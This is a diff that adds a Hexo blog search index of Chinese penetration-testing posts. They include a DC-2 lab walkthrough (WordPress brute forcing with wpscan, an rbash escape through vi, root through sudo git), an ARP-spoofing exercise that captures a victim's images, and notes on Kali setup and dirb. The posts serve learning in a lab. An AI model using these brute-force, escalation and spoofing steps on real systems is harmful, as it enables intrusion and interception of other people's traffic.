@@ -1,0 +1,213 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>DC-2实战梳理</title>
+    <url>/2023/05/04/DC-2%E5%AE%9E%E6%88%98%E6%A2%B3%E7%90%86/</url>
+    <content><![CDATA[<p>涉及知识点</p>
+<blockquote>
+<ol>
+<li>使用 nmap 找寻并扫描靶机。</li>
+<li>使用 dirsearch 爆破网站目录。</li>
+<li>使用 cewl 制作字典。</li>
+<li>使用 wpscan 对 WordPress 站点进行扫描和爆破。</li>
+<li>rbash 绕过</li>
+<li>sudo 提权</li>
+<li>git 提权</li>
+<li>修改 hosts 文件来访问网站。</li>
+</ol>
+</blockquote>
+<p><a name="A4Fdn"></a></p>
+<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><p><a name="Z5Rqj"></a></p>
+<h2 id="1、IP扫描"><a href="#1、IP扫描" class="headerlink" title="1、IP扫描"></a>1、IP扫描</h2><p>法1、fping -g 192.168.221.0&#x2F;24<br />法2、arp-scan -l</p>
+<blockquote>
+<p> arp-scan  是一个用来进行系统发现的ARP命令行扫描工具（可以发现本地网络中的隐藏设备）它可以构造并发送ARP请求到指定的IP地址<br>可以显示本地网络中的所有连接设备，即使这些设备有防火墙。防火墙设备可以屏蔽ping，但是并不能屏蔽ARP数据包。  </p>
+</blockquote>
+<p>法3、nmap -sn 192.168.221.0&#x2F;24</p>
+<p><a name="cOYIm"></a></p>
+<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nmap -T4 -sV -O -A -p- <span class="number">192.168</span><span class="number">.221</span><span class="number">.129</span></span><br><span class="line"><span class="comment">#-T4(速度) </span></span><br><span class="line"><span class="comment"># -sV(版本扫描和开启的服务) </span></span><br><span class="line"><span class="comment"># -O(操作系统) </span></span><br><span class="line"><span class="comment"># -p-（全部端口）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#did not  follow 显示不能跟踪跳转需要设置host</span></span><br></pre></td></tr></table></figure>
+<p><a name="Yq4Rp"></a></p>
+<h2 id="3、网站目录扫描"><a href="#3、网站目录扫描" class="headerlink" title="3、网站目录扫描"></a>3、网站目录扫描</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 法一：使用dirb</span></span><br><span class="line">dirb http://<span class="number">192.168</span><span class="number">.221</span><span class="number">.129</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">dirb http://dc-<span class="number">2</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 法二：使用dirsearch</span></span><br><span class="line">dirsearch -u http://dc-<span class="number">2</span>/ -e * -x <span class="number">403</span> <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -u接网站地址</span></span><br><span class="line">    <span class="comment"># -e后接语言，可选php，asp，*（表示全部语言）等</span></span><br><span class="line">    <span class="comment"># -x表示过滤的状态码，扫描出来后不显示该状态</span></span><br></pre></td></tr></table></figure>
+<p><a name="gXRXk"></a></p>
+<h2 id="4、网页信息探测"><a href="#4、网页信息探测" class="headerlink" title="4、网页信息探测"></a>4、网页信息探测</h2><blockquote>
+<p><em>下载浏览器插件：Wappalyzer–通过 Wappalyzer 可以识别出网站采用了那种 web 技术。它能够检测出 CMS 和电子商务系统、留言板、javascript 框架，主机面板，分析统计工具和其它的一些 web 系统。The company behind Wappalyzer 还能够收集 web 程序的一些信息用于统计分析，揭示出各种 web 系统的使用率即增长情况。实际 Wappalyzer 就是一个指纹识别工具。</em></p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683202962408-73ac3e1b-fe5c-420a-9880-b404c3365c76.png#averageHue=%23cbb398&clientId=u0bcc4f02-dffa-4&from=paste&height=827&id=u8dbf84d7&originHeight=827&originWidth=1310&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=163998&status=done&style=none&taskId=u37de4f1c-897f-4877-a0d7-aa5bf07fee1&title=&width=1310" alt="image.png"></p>
+<p><a name="gwmA8"></a></p>
+<h1 id="二、漏洞发现"><a href="#二、漏洞发现" class="headerlink" title="二、漏洞发现"></a>二、漏洞发现</h1><p><a name="yKSKv"></a></p>
+<h2 id="flag1、flag2"><a href="#flag1、flag2" class="headerlink" title="flag1、flag2"></a>flag1、flag2</h2><p>1、根据第一步信息收集中的目录扫描，找到登录界面；可以看到登陆需要用户名和密码，我们根据Flag找找线索<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683205505930-2aa8438e-9f65-4c0b-948b-bd88cbb2892a.png#averageHue=%23f2f2f2&clientId=u05675e4b-254f-4&from=paste&height=726&id=NSGpU&originHeight=726&originWidth=1189&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53147&status=done&style=none&taskId=u03827c84-6e51-4a16-ae85-c637da5a9d8&title=&width=1189" alt="image.png"><br />2、根据flag1的内容，提示我们使用cewl制作密码字典</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将生成的单词列表写入password.txt中</span></span><br><span class="line">cewl http://dc-<span class="number">2</span>/ -w password.txt</span><br></pre></td></tr></table></figure>
+<p>2、由于目前只有密码字典，要登陆网站还需要制作用户名字典；该网站是wordpress搭建的，有一个专门对应的漏洞扫描工具–wpscan</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 枚举wordpress站点中注册过的用户名，来制作用户名字典</span></span><br><span class="line">wpscan --url http://dc-<span class="number">2</span>/ -e u</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683206126585-c870b5ad-f1ec-480b-84a4-e3b4e704f735.png#averageHue=%23292f3b&clientId=u05675e4b-254f-4&from=paste&height=359&id=u2b950ae4&originHeight=441&originWidth=667&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110194&status=done&style=none&taskId=ue0bb74ab-65ec-41e5-b9d9-2e6b3217305&title=&width=543" alt="image.png"><br />3、将上面成功枚举出来的用户名，写入到文件中，作为用户名字典</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写入user.txt</span></span><br><span class="line">vim user.txt</span><br></pre></td></tr></table></figure>
+<p>4、用wpscan调用上面生成的用户名字典和密码字典，对网站进行爆破</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-<span class="number">2</span>/ -U user.txt -P password.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683206375271-a11a8a1d-b363-4f78-a544-f17c847ff522.png#averageHue=%23292e39&clientId=u05675e4b-254f-4&from=paste&height=413&id=ue3816cfd&originHeight=496&originWidth=636&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125073&status=done&style=none&taskId=u301b860e-b307-4d4e-98f0-9960461af79&title=&width=529" alt="image.png"><br />5、成功爆破出用户，尝试使用爆破出来的账号和密码进行登陆；发现只有jerry账号内有pages栏目，且该栏目下找到了flag2<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683206653327-ce093618-ba5b-4475-979e-1e02ca5be02a.png#averageHue=%23e9e5d0&clientId=u05675e4b-254f-4&from=paste&height=758&id=ud57b91b6&originHeight=758&originWidth=1447&originalType=binary&ratio=1&rotation=0&showTitle=false&size=182377&status=done&style=none&taskId=uc675de68-e6b1-4b15-ab23-a07ce44cfef&title=&width=1447" alt="image.png"><br><a name="aK5yw"></a></p>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>ssh登陆服务器，发现只有tom用户能登进去，ls看到有flag3.txt，此时直接vi flag3.txt。提示切换用户</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一、SSH登录到远程靶机</span></span><br><span class="line">ssh -p <span class="number">7744</span> tom@<span class="number">192.168</span><span class="number">.221</span><span class="number">.129</span></span><br><span class="line"><span class="comment"># 二、发现是rbash</span></span><br><span class="line"><span class="comment"># 三、查看可以使用哪些命令</span></span><br><span class="line">echo $PATH</span><br><span class="line">ls &lt;上一个命令输出的路径&gt;</span><br><span class="line"><span class="comment"># 四、用ls查看，发现了flag.txt,直接用vi</span></span><br></pre></td></tr></table></figure>
+
+<p><a name="K8cDq"></a></p>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>根据flag3提示切换用户，但当前无法使用su命令，所以尝试用rbash绕过<br><a name="VGomS"></a></p>
+<h3 id="rbash逃逸"><a href="#rbash逃逸" class="headerlink" title="rbash逃逸"></a>rbash逃逸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一、可以使用vi命令，通过设置shell变量的方式实现逃逸</span></span><br><span class="line"><span class="comment">// 1、vi进入文件中</span></span><br><span class="line"><span class="comment">// 2、输入</span></span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 3、回车后输入</span></span><br><span class="line">：shell</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 4、此时成功进入shell</span></span><br><span class="line"><span class="comment">// 即rbash逃逸成功，但此时有些命令还是无法执行，因为现在只是绕过了rbash的限制，用户权限还是普通用户</span></span><br><span class="line"><span class="comment">// 有很多的命令会出现路径异常，可以用echo $PATH查看当前的搜索路径</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// 5、先看看我们正常的root权限的PATH是什么值</span></span><br><span class="line">──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># echo $PATH                            </span></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6、将上面的值复制，在目标机上修改</span></span><br><span class="line">PATH=<span class="variable">$PATH</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="comment">// 也可以用 </span></span><br><span class="line">export PATH=<span class="variable">$PATH</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="comment">// 如果要替换的话用</span></span><br><span class="line">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a name="ZKTcZ"></a></p>
+<h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><p>逃逸成功后加上权限，此时可以使用su切换用户</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 切换用户并输入前面暴破出来的密码</span></span><br><span class="line">su jerry</span><br><span class="line"></span><br><span class="line"><span class="comment">// 登陆成功后 进去用户目录,发现flag4.txt,直接cat查看</span></span><br><span class="line">  cd /home/jerry</span><br><span class="line">  ls</span><br></pre></td></tr></table></figure>
+<p>flag4提示git提权<br><a name="DMZjG"></a></p>
+<h2 id="final-flag"><a href="#final-flag" class="headerlink" title="final-flag"></a>final-flag</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查看当前用户可以以root身份执行的命令</span></span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发现可以执行git命令，所以可以利用git 提权</span></span><br><span class="line">  sudo git help config</span><br><span class="line">  !/bin/bash</span><br><span class="line"><span class="comment">// 此时已经提权成功了，可以用whoami验证下，显示为root</span></span><br><span class="line">  whoami</span><br><span class="line"><span class="comment">// 进入/root/，发现flag.</span></span><br><span class="line">  cd /root</span><br><span class="line">  ls</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683471227451-bcd3b41b-2adb-4ac3-be1e-025331658613.png#averageHue=%23272b39&clientId=u92967187-204d-4&from=paste&height=168&id=udb06f95e&originHeight=168&originWidth=664&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44088&status=done&style=none&taskId=ufc5a77ee-6507-4887-99a5-7f3f7367c54&title=&width=664" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683471854013-f8b2d396-cdca-4b10-8f5b-8122b9408ceb.png#averageHue=%23262a36&clientId=u92967187-204d-4&from=paste&height=431&id=ue8d9ce7c&originHeight=431&originWidth=553&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98855&status=done&style=none&taskId=u75cdd879-4622-48d2-92da-793e9473983&title=&width=553" alt="image.png"></p>
+<p>渗透结束</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2024/05/29/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>VMware-Kali网络设置</title>
+    <url>/2023/05/04/VMware-Kali%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</url>
+    <content><![CDATA[<p>1、桥接模式-适合设置与主机相同网段<br />2、NAT模式-适合设置与主机不同网段——这里我试过设置与主机同网段，但ip一直无法配置成功<br />3、仅主机模式-只与主机通信，不能与外网通信</p>
+<p>流程：<br />1、设置虚拟机通信模式<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682573064373-06af4029-cd8b-4786-8f4e-02f675492407.png#averageHue=%23f4f4f3&clientId=u8e0517f7-93ec-4&from=paste&height=543&id=u86708d06&originHeight=543&originWidth=876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37032&status=done&style=none&taskId=u3ff15ef4-155d-47b3-8864-eacf8d4bdaa&title=&width=876" alt="image.png"><br />2、查看主机ip dns 网关信息<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682573152019-8f183f43-b17d-4451-bcf4-f3c90cabfbd0.png#averageHue=%23e4e3e2&clientId=u8e0517f7-93ec-4&from=paste&height=711&id=u9ee36cf4&originHeight=711&originWidth=1139&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105094&status=done&style=none&taskId=uf6d2b77a-ef92-47bb-b5e7-f0456d50ce4&title=&width=1139" alt="image.png"><br />3、按模式进行更改<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682573280114-674a8b3d-ef46-420c-be4f-f8ea2f9375bc.png#averageHue=%23dbe2be&clientId=uee4ee051-da7b-4&from=paste&height=853&id=u2bf3b40b&originHeight=853&originWidth=1462&originalType=binary&ratio=1&rotation=0&showTitle=false&size=201870&status=done&style=none&taskId=uad3ce1bb-6801-457b-a25c-682fc8eda09&title=&width=1462" alt="image.png"><br />4、进入虚拟机内配置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682573505272-3922ec73-ae55-4e30-a5ab-865a18aac632.png#averageHue=%23242d3b&clientId=uee4ee051-da7b-4&from=paste&height=510&id=u271a5605&originHeight=510&originWidth=650&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87335&status=done&style=none&taskId=u899bc6e4-07f1-4b55-9bdc-cb4fa0beb57&title=&width=650" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/resolv.conf  #配置dns </span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682575821143-21c9a374-6114-43f1-992c-349315001445.png#averageHue=%23232631&clientId=uee4ee051-da7b-4&from=paste&height=495&id=ude4d5c83&originHeight=495&originWidth=617&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41251&status=done&style=none&taskId=ud10bfba3-ec43-4c4e-b628-ffefb4afcea&title=&width=617" alt="image.png"><br />以上两个文件配置完后，依次执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop NetworkManager   #关闭并设置为开机不启动</span><br><span class="line">systemctl disable NetworkManager		#设置为开机不启动</span><br><span class="line">systemctl restart networking         #重启kali网络服务</span><br><span class="line">ip a          #查看ip是否配置成功</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali2022的python2.7没有pip</title>
+    <url>/2023/05/04/kali2022%E7%9A%84python2.7%E6%B2%A1%E6%9C%89pip/</url>
+    <content><![CDATA[<p>1、进入<a href="https://pypi.org/project/pip/#history">pip</a>下载对应版本，或直接复制下载版本的链接<br />当前kali2022内的python3.10的pip版本是22.3,我下载了这个版本后用python2.7安装，没有用，所以改20.0.1<img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682694772209-153c0f0b-86ce-4c29-9b97-3abd0e2cbae0.png#averageHue=%23242833&clientId=u5b1c6edb-15e4-4&from=paste&height=79&id=uc5c4fe09&originHeight=79&originWidth=569&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12259&status=done&style=none&taskId=u323b4496-ed22-4649-8d1c-ae4794a6d36&title=&width=569" alt="image.png"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 切换到python2.7的pip安装目录  </span></span><br><span class="line">cd /usr/lib/python2<span class="number">.7</span>/dist-packages/</span><br><span class="line"><span class="comment">// 下载pip </span></span><br><span class="line">wget https:<span class="comment">//files.pythonhosted.org/packages/28/af/2c76c8aa46ccdf7578b83d97a11a2d1858794d4be4a1610ade0d30182e8b/pip-20.0.1.tar.gz</span></span><br><span class="line"><span class="comment">// 解压</span></span><br><span class="line">tar -xvf pip-<span class="number">20.0</span><span class="number">.1</span>.tar.gz</span><br><span class="line"><span class="comment">// 进入解压目录</span></span><br><span class="line">cd pip-<span class="number">20.0</span><span class="number">.1</span></span><br><span class="line"><span class="comment">// 执行如下</span></span><br><span class="line">python2<span class="number">.7</span> setup.py build</span><br><span class="line">python2<span class="number">.7</span> setup.py install</span><br><span class="line">python2<span class="number">.7</span> -m pip install --upgrade setuptools</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>验证成功<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682695194063-55c4018c-a67e-4403-9c04-39bc0d1fb4ea.png#averageHue=%23292f43&clientId=u5b1c6edb-15e4-4&from=paste&height=99&id=ud86ecb42&originHeight=99&originWidth=634&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19590&status=done&style=none&taskId=u3360d087-3ddb-404e-9204-9a65b3d41b2&title=&width=634" alt="image.png"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>小练习-利用arp欺骗获取目标机浏览图片</title>
+    <url>/2023/05/04/%E5%B0%8F%E7%BB%83%E4%B9%A0-%E5%88%A9%E7%94%A8arp%E6%AC%BA%E9%AA%97%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%B5%8F%E8%A7%88%E5%9B%BE%E7%89%87/</url>
+    <content><![CDATA[<p><a name="r0Zwd"></a></p>
+<h1 id="一、准备阶段"><a href="#一、准备阶段" class="headerlink" title="一、准备阶段"></a>一、准备阶段</h1><p><a name="MZAfE"></a></p>
+<h4 id="A、操作系统："><a href="#A、操作系统：" class="headerlink" title="A、操作系统："></a>A、操作系统：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标机-centos  192.168.1.33  网关 192.168.1.3</span><br><span class="line">攻击方-kali    192.168.1.114</span><br><span class="line"></span><br><span class="line">要求：</span><br><span class="line">1、目标机与攻击机处于同一个局域网</span><br><span class="line">2、攻击方需知道目标机的ip和目标机的网关</span><br></pre></td></tr></table></figure>
+<p><a name="NNw9c"></a></p>
+<h4 id="B、kali所需工具："><a href="#B、kali所需工具：" class="headerlink" title="B、kali所需工具："></a>B、kali所需工具：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、arpspoof（使用apt install dsniff安装，如果出现未找到软件包之类的，多换几个国内源，再更新下）</span><br><span class="line">2、 driftnet：是一款网络流量捕捉图像并将其显示在小窗口的软件</span><br><span class="line">主要参数：</span><br><span class="line">    -b    捕获到新的图片时发声</span><br><span class="line">    -d    指定保存图片的路径</span><br><span class="line">    -x    指定保存图片的前缀名</span><br><span class="line">    -i    选择监听接口</span><br><span class="line">    -f    读取一个指定pcap数据包中的图片</span><br><span class="line">    -a    后台模式：</span><br><span class="line">    -m    指定保存图片数的数目</span><br></pre></td></tr></table></figure>
+
+<p>二、实操阶段<br />1、kali配置网络<br />将kali的ip设置到与目标机的ip同网段<br />2、相互ping ，查看是否可连通</p>
+<p>3、开始arp攻击：将目标机的网关地址替换成攻击方的ip地址，这样目标机的流量就会从转发到攻击方的机器<br>未开始前查看原始数据未开始前用fping看看同一网段下还存在什么ip,再用arp -a看看目标机的原始arp缓存是什么</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看局域网内存在的主机</span><br><span class="line">fping -g 192.168.1.1/24</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682588958883-433d250d-3008-47e3-958b-3c927d0165a3.png#averageHue=%23272d3d&clientId=u5017a552-0a73-4&from=paste&height=194&id=u0e5d0114&originHeight=194&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50246&status=done&style=none&taskId=u0c46188f-94dd-4517-b7c8-7e4b78cdce4&title=&width=627" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589324113-13ec8f8e-ea61-4d06-827a-b5e7d043a255.png#averageHue=%23320c27&clientId=u5017a552-0a73-4&from=paste&height=273&id=u386cf0df&originHeight=273&originWidth=553&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91844&status=done&style=none&taskId=u3b6af19c-d8a8-4bb3-af47-d2c0c86970e&title=&width=553" alt="image.png"></p>
+<p>开始用arpspoof工具进行arp攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开启路由转发，实验结束后关闭即可，这个不开的话受害主机就断网了</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward   </span><br><span class="line"></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.33 192.168.1.3</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">-i后面的参数是网卡名称</span><br><span class="line">-t后面的参数是目的主机和网关，要截获目的主机发往网关的数据包</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589758417-9a15a4ab-7d30-4080-8d72-7b04ed676bb9.png#averageHue=%23272d3c&clientId=u5017a552-0a73-4&from=paste&height=246&id=u1f74a382&originHeight=246&originWidth=647&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72089&status=done&style=none&taskId=u29a8704b-a6ad-4d09-aae9-e453f4ecb61&title=&width=647" alt="image.png"><br />不终止程序，来到目标机查看arp缓存 <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589968057-85f3e6a7-2593-4409-98f0-a3c1d7b09147.png#averageHue=%23330d27&clientId=u5017a552-0a73-4&from=paste&height=143&id=u22d3c497&originHeight=143&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59771&status=done&style=none&taskId=ud2c7f962-6cbb-4e9b-a988-f1b3febfc3b&title=&width=534" alt="image.png"><br />4、使用driftnet查看<br />此时，在目标机内查看图片（只能查看http的，https无法获取），攻击方在driftnet内就能看到图片</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682590495272-5a23672a-71ef-4756-920b-6bceffc61e68.png#averageHue=%2394744e&clientId=u5017a552-0a73-4&from=paste&height=866&id=u0fb8b485&originHeight=866&originWidth=1596&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1470505&status=done&style=none&taskId=uecb3de18-d2b2-40e4-bafa-25a883d9f90&title=&width=1596" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683102987062-43478815-bedc-4fad-b30b-b5d5b89c6eca.png#averageHue=%232a2f3d&clientId=u925194d7-4358-4&from=paste&height=878&id=u31f37fc2&originHeight=878&originWidth=1668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=191263&status=done&style=none&taskId=u3510c0c6-a88b-40ad-ae24-1ecba883644&title=&width=1668" alt="image.png"><br />总结：图片抓取不是很准确，有的能抓，有的不能，有时可抓，有时又不可抓。。。。。抓的不全<br />而且这个图片界面也没有滚动条</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>目录扫描工具-dirb、dirbuster</title>
+    <url>/2023/05/06/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-dirb%E3%80%81dirbuster/</url>
+    <content><![CDATA[<p><a name="ymqfO"></a></p>
+<h1 id="一、kali自带扫描工具-dirb"><a href="#一、kali自带扫描工具-dirb" class="headerlink" title="一、kali自带扫描工具-dirb"></a>一、kali自带扫描工具-dirb</h1><p><a name="llkVi"></a></p>
+<h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><blockquote>
+<p>dirb是一个基于字典的Web目录扫描工具（kalI自带），采用递归的方式去获取更多的目录；<br>可以查找到已知的和隐藏的目录；<br>支持代理，延迟访问和添加请求头。</p>
+</blockquote>
+<p><a name="SiMTP"></a></p>
+<h2 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h2><p>大多数情况下，如果对一个网站的语言不清楚，可以直接使用dirb进行扫描，但访问过多会被封IP，所以最好使用时<strong>设置参数</strong><br><a name="mEknu"></a></p>
+<h5 id="直接使用："><a href="#直接使用：" class="headerlink" title="直接使用："></a>直接使用：</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dirb 域名/主机ip</span><br><span class="line">示例：</span><br><span class="line">dirb http://dc-<span class="number">2</span>/</span><br><span class="line">dirb http://<span class="number">114.67</span><span class="number">.175</span><span class="number">.24</span>:<span class="number">17896</span></span><br></pre></td></tr></table></figure>
+<p><a name="brycL"></a></p>
+<h5 id="加参数："><a href="#加参数：" class="headerlink" title="加参数："></a>加参数：</h5><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-a</td>
+<td>设置User-Agent</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>proxy，设置代理</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>cookie，设置cookie</td>
+</tr>
+<tr>
+<td>-z</td>
+<td>设置访问间的延迟，单位毫秒（可以避免ip被封）</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>oupput，可以控制输出结果到指定的路径文件中</td>
+</tr>
+<tr>
+<td>-X（大写）</td>
+<td>如果已经确定要扫描的文件后缀，可以使用此参数，直接加上后缀（某种程度上可以减少扫描）</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>不区分大小写</td>
+</tr>
+<tr>
+<td>-H</td>
+<td>添加请求头</td>
+</tr>
+</tbody></table>
